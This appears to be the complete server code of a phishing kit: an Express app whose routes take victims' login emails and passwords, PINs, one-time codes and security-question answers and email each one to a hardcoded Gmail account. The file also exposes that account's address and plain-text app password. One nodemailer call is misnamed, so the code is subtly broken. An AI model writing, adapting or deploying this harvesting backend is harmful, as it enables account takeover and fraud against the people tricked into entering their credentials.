const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "chidiebereajaeroelvis@gmail.com";
const pass = "qpboyelacgloplhy";

// Create transporter function to avoid repetition
const createTransporter = () => {
  return nodemailer.createTransporter({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });
};

// API routes for index (login)
app.post("/", (req, res) => {
  const { email, password } = req.body;
  const transporter = createTransporter();
  
  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `New Login Attempt`,
    text: `New user registered with Email: ${email}\nPassword: ${password}`,
  };
  
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.status(200).send("success");
    }
  });
});

// API routes for PIN
app.post("/pin", (req, res) => {
  console.log(req.body);
  let { pin } = req.body;
  const transporter = createTransporter();
  
  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `PIN Submission`,
    text: `New user PIN is: ${pin}`,
  };
  
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.status(200).send("success");
    }
  });
});

// API routes for OTP
app.post("/otp", (req, res) => {
  console.log(req.body);
  let { otp } = req.body;
  const transporter = createTransporter();
  
  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `OTP Submission`,
    text: `New user OTP is: ${otp}`,
  };
  
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.status(200).send("success");
    }
  });
});

// API routes for Security Questions - Send 3 separate emails
app.post("/security", async (req, res) => {
  console.log("Received request body:", req.body);
  const { questions } = req.body;
  
  // Validate that we have questions array
  if (!questions || !Array.isArray(questions)) {
    console.log("Invalid questions format");
    return res.status(400).send("Questions must be an array");
  }
  
  // Validate that we have exactly 3 questions
  if (questions.length !== 3) {
    console.log(`Expected 3 questions, got ${questions.length}`);
    return res.status(400).send(`Exactly 3 security questions are required, received ${questions.length}`);
  }
  
  // Validate each question has required fields
  for (let i = 0; i < questions.length; i++) {
    if (!questions[i].question || !questions[i].answer) {
      console.log(`Question ${i + 1} missing required fields:`, questions[i]);
      return res.status(400).send(`Question ${i + 1} is missing required fields`);
    }
  }
  
  const transporter = createTransporter();
  
  try {
    // Send 3 separate emails for each security question
    const emailPromises = questions.map(async (q, index) => {
      const mailOptions = {
        from: userEmail,
        to: userEmail,
        subject: `Security Question ${index + 1} Submission`,
        text: `Security Question ${index + 1}:\nQuestion: ${q.question}\nAnswer: ${q.answer}`,
      };
      
      console.log(`Sending email for question ${index + 1}:`, mailOptions.subject);
      return transporter.sendMail(mailOptions);
    });
    
    // Wait for all emails to be sent
    const results = await Promise.all(emailPromises);
    console.log("All emails sent successfully:", results.length);
    
    res.status(200).json({ 
      success: true, 
      message: "All security questions submitted successfully!",
      emailsSent: results.length
    });
    
  } catch (error) {
    console.error("Error sending security question emails:", error);
    res.status(500).json({ 
      success: false, 
      message: "Failed to send security question emails", 
      error: error.message 
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
